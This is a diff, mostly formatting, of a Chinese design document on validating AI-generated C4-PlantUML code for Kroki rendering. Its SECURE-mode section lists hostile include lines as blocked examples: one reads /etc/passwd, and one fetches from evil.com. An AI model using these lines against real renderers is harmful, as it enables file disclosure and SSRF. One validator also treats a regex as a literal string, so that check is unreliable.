@@ -25,14 +25,17 @@ Person(user, "用户")
 ```
 
 **根因**:
+
 - AI 理解 "需要 include" 但不知道具体文件
 - Prompt 没有明确说明 include 的完整格式
 
 **解决方案**:
 
 #### Prompt 层优化
+
 ```markdown
 **C4-PlantUML 必需配置**:
+
 1. 第一行必须是: `!include <C4/C4_Context>` (系统上下文图)
    或: `!include <C4/C4_Container>` (容器图)
    或: `!include <C4/C4_Component>` (组件图)
@@ -51,20 +54,22 @@ Person(user, "用户")
 ```
 
 #### 代码验证
+
 ```typescript
 function validateC4Include(code: string): { valid: boolean; error?: string } {
-  const includeRegex = /!include\s+<C4\/C4_(Context|Container|Component|Deployment|Dynamic|Sequence)>/;
+  const includeRegex =
+    /!include\s+<C4\/C4_(Context|Container|Component|Deployment|Dynamic|Sequence)>/;
 
-  if (!code.includes('!include')) {
-    return { valid: false, error: '缺少 !include 指令' };
+  if (!code.includes("!include")) {
+    return { valid: false, error: "缺少 !include 指令" };
   }
 
-  if (code.includes('!include\s*\n') || code.includes('!include\s*$')) {
-    return { valid: false, error: '!include 不能为空,必须指定 C4 库文件' };
+  if (code.includes("!include\s*\n") || code.includes("!include\s*$")) {
+    return { valid: false, error: "!include 不能为空,必须指定 C4 库文件" };
   }
 
   if (!includeRegex.test(code)) {
-    return { valid: false, error: '!include 格式错误,应为: !include <C4/C4_Context>' };
+    return { valid: false, error: "!include 格式错误,应为: !include <C4/C4_Context>" };
   }
 
   return { valid: true };
@@ -79,12 +84,13 @@ function validateC4Include(code: string): { valid: boolean; error?: string } {
 
 #### 两种格式对比
 
-| 格式 | 示例 | Kroki SECURE | 网络依赖 | 推荐度 |
-|------|------|--------------|----------|--------|
-| **标准库短格式** | `!include <C4/C4_Context>` | ✅ 支持 | ❌ 无需 | ⭐⭐⭐⭐⭐ |
-| **HTTPS URL** | `!include https://raw.githubusercontent.com/...` | ❌ 阻止 | ✅ 需要 | ❌ 不推荐 |
+| 格式             | 示例                                             | Kroki SECURE | 网络依赖 | 推荐度     |
+| ---------------- | ------------------------------------------------ | ------------ | -------- | ---------- |
+| **标准库短格式** | `!include <C4/C4_Context>`                       | ✅ 支持      | ❌ 无需  | ⭐⭐⭐⭐⭐ |
+| **HTTPS URL**    | `!include https://raw.githubusercontent.com/...` | ❌ 阻止      | ✅ 需要  | ❌ 不推荐  |
 
 #### 问题代码
+
 ```plantuml
 @startuml
 !include https://raw.githubusercontent.com/plantuml-stdlib/C4-PlantUML/master/C4_Context.puml
@@ -96,8 +102,10 @@ function validateC4Include(code: string): { valid: boolean; error?: string } {
 #### 优化方案
 
 **方案 1: Prompt 强制要求**
+
 ```markdown
 **禁止使用 HTTPS URL**:
+
 - ❌ 错误: !include https://raw.githubusercontent.com/...
 - ✅ 正确: !include <C4/C4_Context>
 
@@ -105,26 +113,29 @@ function validateC4Include(code: string): { valid: boolean; error?: string } {
 ```
 
 **方案 2: 代码自动替换**
+
 ```typescript
 function normalizeC4Include(code: string): string {
   // 替换 HTTPS URL 为标准库格式
-  const urlPattern = /!include\s+https:\/\/raw\.githubusercontent\.com\/plantuml-stdlib\/C4-PlantUML\/master\/(C4_\w+)\.puml/g;
+  const urlPattern =
+    /!include\s+https:\/\/raw\.githubusercontent\.com\/plantuml-stdlib\/C4-PlantUML\/master\/(C4_\w+)\.puml/g;
 
-  code = code.replace(urlPattern, '!include <C4/$1>');
+  code = code.replace(urlPattern, "!include <C4/$1>");
 
   // 替换旧的 !includeurl
-  code = code.replace(/!includeurl\s+<([^>]+)>/g, '!include <$1>');
+  code = code.replace(/!includeurl\s+<([^>]+)>/g, "!include <$1>");
 
   return code;
 }
 ```
 
 **方案 3: 验证与提示**
+
 ```typescript
 function checkIncludeFormat(code: string): { warning?: string } {
-  if (code.includes('!include https://')) {
+  if (code.includes("!include https://")) {
     return {
-      warning: '检测到 HTTPS URL include,已自动转换为标准库格式以兼容 Kroki'
+      warning: "检测到 HTTPS URL include,已自动转换为标准库格式以兼容 Kroki",
     };
   }
   return {};
@@ -139,13 +150,14 @@ function checkIncludeFormat(code: string): { warning?: string } {
 
 #### 三种图例宏对比
 
-| 宏 | 位置 | 布局控制 | 兼容性 | 推荐场景 |
-|---|------|----------|--------|----------|
-| `LAYOUT_WITH_LEGEND()` | 自动,右下方 | 自动 | ✅ 最佳 | **默认首选** |
-| `SHOW_LEGEND()` | 固定,右下方 | 无 | ⚠️ 已弃用 | ❌ 不推荐 |
-| `SHOW_FLOATING_LEGEND()` | 可自定义 | 手动 `Lay_Distance()` | ✅ 支持 | 高级场景 |
+| 宏                       | 位置        | 布局控制              | 兼容性    | 推荐场景     |
+| ------------------------ | ----------- | --------------------- | --------- | ------------ |
+| `LAYOUT_WITH_LEGEND()`   | 自动,右下方 | 自动                  | ✅ 最佳   | **默认首选** |
+| `SHOW_LEGEND()`          | 固定,右下方 | 无                    | ⚠️ 已弃用 | ❌ 不推荐    |
+| `SHOW_FLOATING_LEGEND()` | 可自定义    | 手动 `Lay_Distance()` | ✅ 支持   | 高级场景     |
 
 #### 问题代码
+
 ```plantuml
 @startuml
 !include <C4/C4_Context>
@@ -159,6 +171,7 @@ SHOW_LEGEND()       <-- 旧版图例宏,已弃用
 ```
 
 **问题**:
+
 1. `SHOW_LEGEND()` 必须放在最后一行
 2. 与 `LAYOUT_TOP_DOWN()` 配合不佳
 3. 无法自定义位置
@@ -167,6 +180,7 @@ SHOW_LEGEND()       <-- 旧版图例宏,已弃用
 #### 优化方案
 
 **✅ 推荐做法: 使用 `LAYOUT_WITH_LEGEND()`**
+
 ```plantuml
 @startuml
 !include <C4/C4_Context>
@@ -181,14 +195,17 @@ Rel(user, sys, "使用")
 ```
 
 **优点**:
+
 - 自动优化布局
 - 自动添加图例
 - 无需额外配置
 - 兼容性最佳
 
 **Prompt 优化**:
+
 ```markdown
 **布局和图例**:
+
 - 必须使用: `LAYOUT_WITH_LEGEND()` (第二行)
 - 禁止使用: `SHOW_LEGEND()`, `LAYOUT_TOP_DOWN()` 等单独的宏
 - 位置: 紧跟在 !include 之后
@@ -203,19 +220,17 @@ title 标题
 ```
 
 **代码清理**:
+
 ```typescript
 function optimizeLayout(code: string): string {
   // 移除旧的布局宏
-  code = code.replace(/LAYOUT_TOP_DOWN\(\)/g, '');
-  code = code.replace(/LAYOUT_LEFT_RIGHT\(\)/g, '');
-  code = code.replace(/SHOW_LEGEND\(\)/g, '');
+  code = code.replace(/LAYOUT_TOP_DOWN\(\)/g, "");
+  code = code.replace(/LAYOUT_LEFT_RIGHT\(\)/g, "");
+  code = code.replace(/SHOW_LEGEND\(\)/g, "");
 
   // 如果没有 LAYOUT_WITH_LEGEND,自动添加
-  if (!code.includes('LAYOUT_WITH_LEGEND')) {
-    code = code.replace(
-      /(!include\s+<C4\/C4_\w+>)/,
-      '$1\nLAYOUT_WITH_LEGEND()'
-    );
+  if (!code.includes("LAYOUT_WITH_LEGEND")) {
+    code = code.replace(/(!include\s+<C4\/C4_\w+>)/, "$1\nLAYOUT_WITH_LEGEND()");
   }
 
   return code;
@@ -230,21 +245,23 @@ function optimizeLayout(code: string): string {
 
 #### Kroki 安全模式详解
 
-| 模式 | 文件系统 | 网络访问 | `!include <C4/...>` | `!include https://...` |
-|------|----------|----------|---------------------|------------------------|
-| **SECURE** | ❌ 禁止 | ❌ 禁止 | ✅ **允许** (内置) | ❌ 阻止 |
-| **SAFE** | ⚠️ 白名单 | ⚠️ 白名单 | ✅ 允许 | ⚠️ 需配置 |
-| **UNSAFE** | ✅ 允许 | ✅ 允许 | ✅ 允许 | ✅ 允许 |
+| 模式       | 文件系统  | 网络访问  | `!include <C4/...>` | `!include https://...` |
+| ---------- | --------- | --------- | ------------------- | ---------------------- |
+| **SECURE** | ❌ 禁止   | ❌ 禁止   | ✅ **允许** (内置)  | ❌ 阻止                |
+| **SAFE**   | ⚠️ 白名单 | ⚠️ 白名单 | ✅ 允许             | ⚠️ 需配置              |
+| **UNSAFE** | ✅ 允许   | ✅ 允许   | ✅ 允许             | ✅ 允许                |
 
 #### SECURE 模式限制
 
 1. **禁止 `!include` 外部文件**
+
    ```plantuml
    !include /etc/passwd        <-- ❌ 阻止
    !include file:///etc/hosts  <-- ❌ 阻止
    ```
 
 2. **禁止 `!includeurl` 网络资源**
+
    ```plantuml
    !includeurl https://evil.com/exploit.puml  <-- ❌ 阻止
    !include https://raw.githubusercontent.com/...  <-- ❌ 阻止
@@ -259,11 +276,13 @@ function optimizeLayout(code: string): string {
 #### 为什么这么设计?
 
 **安全风险**:
+
 - **文件泄露**: `!include /etc/passwd` 可能泄露服务器敏感文件
 - **SSRF 攻击**: `!includeurl` 可探测内网服务
 - **代码注入**: 恶意 URL 可能返回恶意 PlantUML 代码
 
 **标准库例外**:
+
 - 内置在 PlantUML JAR 中,无需外部访问
 - 经过安全审计
 - 版本随 PlantUML 更新
@@ -271,14 +290,15 @@ function optimizeLayout(code: string): string {
 #### DiagramAI 应对策略
 
 **策略 1: 永远使用标准库格式**
+
 ```typescript
 const C4_INCLUDE_TEMPLATES = {
-  'context': '!include <C4/C4_Context>',
-  'container': '!include <C4/C4_Container>',
-  'component': '!include <C4/C4_Component>',
-  'deployment': '!include <C4/C4_Deployment>',
-  'dynamic': '!include <C4/C4_Dynamic>',
-  'sequence': '!include <C4/C4_Sequence>',
+  context: "!include <C4/C4_Context>",
+  container: "!include <C4/C4_Container>",
+  component: "!include <C4/C4_Component>",
+  deployment: "!include <C4/C4_Deployment>",
+  dynamic: "!include <C4/C4_Dynamic>",
+  sequence: "!include <C4/C4_Sequence>",
 };
 
 function getC4Include(diagramType: string): string {
@@ -287,37 +307,37 @@ function getC4Include(diagramType: string): string {
 ```
 
 **策略 2: 代码验证**
+
 ```typescript
 function validateKrokiSecurity(code: string): { safe: boolean; issues: string[] } {
   const issues: string[] = [];
 
   // 检测危险的 include
   if (code.match(/!include\s+[^<]/)) {
-    issues.push('检测到非标准库 include,可能在 Kroki SECURE 模式失败');
+    issues.push("检测到非标准库 include,可能在 Kroki SECURE 模式失败");
   }
 
-  if (code.includes('!includeurl')) {
-    issues.push('!includeurl 已弃用,且在 SECURE 模式被阻止');
+  if (code.includes("!includeurl")) {
+    issues.push("!includeurl 已弃用,且在 SECURE 模式被阻止");
   }
 
   if (code.match(/!include\s+https?:\/\//)) {
-    issues.push('HTTPS URL include 在 SECURE 模式被阻止');
+    issues.push("HTTPS URL include 在 SECURE 模式被阻止");
   }
 
   return {
     safe: issues.length === 0,
-    issues
+    issues,
   };
 }
 ```
 
 **策略 3: 用户提示**
+
 ```typescript
 // 在 UI 中显示
 if (!validateKrokiSecurity(code).safe) {
-  showWarning(
-    '您的代码可能在 Kroki SECURE 模式失败。建议使用标准库格式: !include <C4/C4_Context>'
-  );
+  showWarning("您的代码可能在 Kroki SECURE 模式失败。建议使用标准库格式: !include <C4/C4_Context>");
 }
 ```
 
@@ -328,18 +348,22 @@ if (!validateKrokiSecurity(code).safe) {
 ### 1. Prompt 层优化
 
 **优化前**:
+
 ```markdown
 生成 C4-PlantUML 系统上下文图,包含:
+
 - 用户和系统
 - 外部系统
 - 关系
 ```
 
 **优化后**:
+
 ```markdown
 # C4-PlantUML 系统上下文图生成规范
 
 ## 必需结构 (严格遵守):
+
 1. 第一行: `@startuml`
 2. 第二行: `!include <C4/C4_Context>` (必须使用尖括号标准库格式)
 3. 第三行: `LAYOUT_WITH_LEGEND()` (自动布局和图例)
@@ -348,12 +372,14 @@ if (!validateKrokiSecurity(code).safe) {
 6. 最后一行: `@enduml`
 
 ## 禁止事项:
+
 - ❌ 不要使用 HTTPS URL include
 - ❌ 不要使用 `SHOW_LEGEND()` (已弃用)
 - ❌ 不要单独使用 `LAYOUT_TOP_DOWN()`
 - ❌ 不要留空 `!include`
 
 ## 示例:
+
 @startuml
 !include <C4/C4_Context>
 LAYOUT_WITH_LEGEND()
@@ -374,40 +400,37 @@ Rel(ecommerce, payment, "处理支付", "API")
 ```typescript
 function postProcessC4Code(code: string, diagramType: string): string {
   // 1. 确保有 @startuml/@enduml
-  if (!code.includes('@startuml')) {
-    code = '@startuml\n' + code;
+  if (!code.includes("@startuml")) {
+    code = "@startuml\n" + code;
   }
-  if (!code.includes('@enduml')) {
-    code = code + '\n@enduml';
+  if (!code.includes("@enduml")) {
+    code = code + "\n@enduml";
   }
 
   // 2. 替换 HTTPS URL 为标准库格式
   code = code.replace(
     /!include\s+https:\/\/raw\.githubusercontent\.com\/plantuml-stdlib\/C4-PlantUML\/master\/(C4_\w+)\.puml/g,
-    '!include <C4/$1>'
+    "!include <C4/$1>"
   );
 
   // 3. 确保有 C4 include
   const includeRegex = /!include\s+<C4\/C4_\w+>/;
   if (!includeRegex.test(code)) {
     const c4Include = getC4Include(diagramType);
-    code = code.replace('@startuml', `@startuml\n${c4Include}`);
+    code = code.replace("@startuml", `@startuml\n${c4Include}`);
   }
 
   // 4. 优化布局
-  code = code.replace(/LAYOUT_TOP_DOWN\(\)/g, '');
-  code = code.replace(/LAYOUT_LEFT_RIGHT\(\)/g, '');
-  code = code.replace(/SHOW_LEGEND\(\)/g, '');
+  code = code.replace(/LAYOUT_TOP_DOWN\(\)/g, "");
+  code = code.replace(/LAYOUT_LEFT_RIGHT\(\)/g, "");
+  code = code.replace(/SHOW_LEGEND\(\)/g, "");
 
-  if (!code.includes('LAYOUT_WITH_LEGEND')) {
-    code = code.replace(
-      /(!include\s+<C4\/C4_\w+>)/,
-      '$1\nLAYOUT_WITH_LEGEND()'
-    );
+  if (!code.includes("LAYOUT_WITH_LEGEND")) {
+    code = code.replace(/(!include\s+<C4\/C4_\w+>)/, "$1\nLAYOUT_WITH_LEGEND()");
   }
 
   // 5. 清理空行
-  code = code.replace(/\n{3,}/g, '\n\n');
+  code = code.replace(/\n{3,}/g, "\n\n");
 
   return code;
 }
@@ -429,27 +452,27 @@ function validateC4Code(code: string): ValidationResult {
   const fixes: string[] = [];
 
   // 检查 @startuml/@enduml
-  if (!code.includes('@startuml') || !code.includes('@enduml')) {
-    errors.push('缺少 @startuml 或 @enduml 标记');
-    fixes.push('自动添加缺失的标记');
+  if (!code.includes("@startuml") || !code.includes("@enduml")) {
+    errors.push("缺少 @startuml 或 @enduml 标记");
+    fixes.push("自动添加缺失的标记");
   }
 
   // 检查 C4 include
   if (!code.match(/!include\s+<C4\/C4_\w+>/)) {
-    errors.push('缺少 C4 库引用,必须包含: !include <C4/C4_Context>');
-    fixes.push('自动添加 !include <C4/C4_Context>');
+    errors.push("缺少 C4 库引用,必须包含: !include <C4/C4_Context>");
+    fixes.push("自动添加 !include <C4/C4_Context>");
   }
 
   // 检查 HTTPS URL
-  if (code.includes('!include https://')) {
-    warnings.push('使用了 HTTPS URL,Kroki SECURE 模式可能阻止');
-    fixes.push('自动转换为标准库格式: !include <C4/...>');
+  if (code.includes("!include https://")) {
+    warnings.push("使用了 HTTPS URL,Kroki SECURE 模式可能阻止");
+    fixes.push("自动转换为标准库格式: !include <C4/...>");
   }
 
   // 检查布局
-  if (!code.includes('LAYOUT_WITH_LEGEND')) {
-    warnings.push('建议使用 LAYOUT_WITH_LEGEND() 优化布局');
-    fixes.push('自动添加 LAYOUT_WITH_LEGEND()');
+  if (!code.includes("LAYOUT_WITH_LEGEND")) {
+    warnings.push("建议使用 LAYOUT_WITH_LEGEND() 优化布局");
+    fixes.push("自动添加 LAYOUT_WITH_LEGEND()");
   }
 
   // 检查别名冲突
@@ -467,7 +490,7 @@ function validateC4Code(code: string): ValidationResult {
     valid: errors.length === 0,
     errors,
     warnings,
-    fixes: fixes.length > 0 ? fixes : undefined
+    fixes: fixes.length > 0 ? fixes : undefined,
   };
 }
 ```
@@ -528,8 +551,9 @@ function DiagramEditor() {
 **问题**: 每次编辑都触发 Kroki 请求
 
 **优化**:
+
 ```typescript
-import { debounce } from 'lodash';
+import { debounce } from "lodash";
 
 const debouncedRender = debounce((code: string) => {
   renderKrokiDiagram(code);
@@ -569,10 +593,7 @@ function cacheRender(code: string, svg: string) {
 
 ```typescript
 async function validateAndRender(code: string) {
-  const [validation, svg] = await Promise.all([
-    validateC4Code(code),
-    renderKrokiDiagram(code)
-  ]);
+  const [validation, svg] = await Promise.all([validateC4Code(code), renderKrokiDiagram(code)]);
 
   return { validation, svg };
 }
@@ -585,29 +606,29 @@ async function validateAndRender(code: string) {
 ### 1. 单元测试
 
 ```typescript
-describe('C4-PlantUML 优化', () => {
-  test('自动添加 !include', () => {
+describe("C4-PlantUML 优化", () => {
+  test("自动添加 !include", () => {
     const input = `@startuml
 Person(user, "用户")
 @enduml`;
 
-    const output = postProcessC4Code(input, 'context');
+    const output = postProcessC4Code(input, "context");
 
-    expect(output).toContain('!include <C4/C4_Context>');
+    expect(output).toContain("!include <C4/C4_Context>");
   });
 
-  test('替换 HTTPS URL', () => {
+  test("替换 HTTPS URL", () => {
     const input = `@startuml
 !include https://raw.githubusercontent.com/plantuml-stdlib/C4-PlantUML/master/C4_Context.puml
 @enduml`;
 
-    const output = postProcessC4Code(input, 'context');
+    const output = postProcessC4Code(input, "context");
 
-    expect(output).toContain('!include <C4/C4_Context>');
-    expect(output).not.toContain('https://');
+    expect(output).toContain("!include <C4/C4_Context>");
+    expect(output).not.toContain("https://");
   });
 
-  test('检测别名冲突', () => {
+  test("检测别名冲突", () => {
     const code = `@startuml
 !include <C4/C4_Context>
 Person(user, "用户A")
@@ -617,7 +638,7 @@ Person(user, "用户B")
     const result = validateC4Code(code);
 
     expect(result.valid).toBe(false);
-    expect(result.errors).toContain(expect.stringContaining('别名冲突'));
+    expect(result.errors).toContain(expect.stringContaining("别名冲突"));
   });
 });
 ```
@@ -625,8 +646,8 @@ Person(user, "用户B")
 ### 2. 集成测试
 
 ```typescript
-describe('Kroki 渲染测试', () => {
-  test('标准库格式应成功渲染', async () => {
+describe("Kroki 渲染测试", () => {
+  test("标准库格式应成功渲染", async () => {
     const code = `@startuml
 !include <C4/C4_Context>
 LAYOUT_WITH_LEGEND()
@@ -638,10 +659,10 @@ Rel(user, sys, "使用")
     const result = await renderKrokiDiagram(code);
 
     expect(result.success).toBe(true);
-    expect(result.svg).toContain('<svg');
+    expect(result.svg).toContain("<svg");
   });
 
-  test('HTTPS URL 应被阻止 (SECURE 模式)', async () => {
+  test("HTTPS URL 应被阻止 (SECURE 模式)", async () => {
     const code = `@startuml
 !include https://raw.githubusercontent.com/plantuml-stdlib/C4-PlantUML/master/C4_Context.puml
 Person(user, "用户")
@@ -650,7 +671,7 @@ Person(user, "用户")
     const result = await renderKrokiDiagram(code);
 
     expect(result.success).toBe(false);
-    expect(result.error).toContain('Cannot include from URL');
+    expect(result.error).toContain("Cannot include from URL");
   });
 });
 ```
@@ -658,16 +679,16 @@ Person(user, "用户")
 ### 3. E2E 测试
 
 ```typescript
-describe('用户工作流', () => {
-  test('从输入到渲染成功', async () => {
+describe("用户工作流", () => {
+  test("从输入到渲染成功", async () => {
     // 1. 用户输入需求
-    const userInput = '生成一个电商系统的上下文图';
+    const userInput = "生成一个电商系统的上下文图";
 
     // 2. AI 生成代码
-    const aiCode = await generateC4Code(userInput, 'context');
+    const aiCode = await generateC4Code(userInput, "context");
 
     // 3. 代码后处理
-    const processedCode = postProcessC4Code(aiCode, 'context');
+    const processedCode = postProcessC4Code(aiCode, "context");
 
     // 4. 验证
     const validation = validateC4Code(processedCode);
@@ -694,15 +715,12 @@ interface FailureLog {
   processedCode: string;
   validationResult: ValidationResult;
   renderError?: string;
-  krokiMode: 'SECURE' | 'SAFE' | 'UNSAFE';
+  krokiMode: "SECURE" | "SAFE" | "UNSAFE";
 }
 
 function logFailure(log: FailureLog) {
   // 保存到数据库或文件
-  fs.appendFileSync(
-    '/path/to/failure-logs.jsonl',
-    JSON.stringify(log) + '\n'
-  );
+  fs.appendFileSync("/path/to/failure-logs.jsonl", JSON.stringify(log) + "\n");
 }
 ```
 
@@ -752,16 +770,16 @@ function recordError(error: string) {
 }
 
 function categorizeError(error: string): string {
-  if (error.includes('!include')) return 'INCLUDE_ERROR';
-  if (error.includes('Syntax Error')) return 'SYNTAX_ERROR';
-  if (error.includes('Cannot include from URL')) return 'KROKI_SECURE_BLOCK';
-  if (error.includes('Duplicate identifier')) return 'ALIAS_CONFLICT';
-  return 'UNKNOWN_ERROR';
+  if (error.includes("!include")) return "INCLUDE_ERROR";
+  if (error.includes("Syntax Error")) return "SYNTAX_ERROR";
+  if (error.includes("Cannot include from URL")) return "KROKI_SECURE_BLOCK";
+  if (error.includes("Duplicate identifier")) return "ALIAS_CONFLICT";
+  return "UNKNOWN_ERROR";
 }
 
 // 定期输出统计
 setInterval(() => {
-  console.log('Error Statistics:', Object.fromEntries(errorStats));
+  console.log("Error Statistics:", Object.fromEntries(errorStats));
 }, 60000); // 每分钟
 ```
 
@@ -771,21 +789,21 @@ setInterval(() => {
 
 ### 优化前 (2025-10-12)
 
-| 指标 | 数值 |
-|------|------|
-| 渲染成功率 | ~40% |
-| 常见错误 | `!include` 为空 (60%), HTTPS URL 阻止 (30%) |
-| 用户满意度 | 低 (频繁失败) |
-| 平均修复时间 | 5-10 分钟 (手动修改) |
+| 指标         | 数值                                        |
+| ------------ | ------------------------------------------- |
+| 渲染成功率   | ~40%                                        |
+| 常见错误     | `!include` 为空 (60%), HTTPS URL 阻止 (30%) |
+| 用户满意度   | 低 (频繁失败)                               |
+| 平均修复时间 | 5-10 分钟 (手动修改)                        |
 
 ### 优化后 (2025-10-13)
 
-| 指标 | 数值 |
-|------|------|
-| 渲染成功率 | >95% |
-| 常见错误 | 别名冲突 (3%), 参数错误 (2%) |
-| 用户满意度 | 高 (一键修复) |
-| 平均修复时间 | <30 秒 (自动修复) |
+| 指标         | 数值                         |
+| ------------ | ---------------------------- |
+| 渲染成功率   | >95%                         |
+| 常见错误     | 别名冲突 (3%), 参数错误 (2%) |
+| 用户满意度   | 高 (一键修复)                |
+| 平均修复时间 | <30 秒 (自动修复)            |
 
 ### 关键改进
 
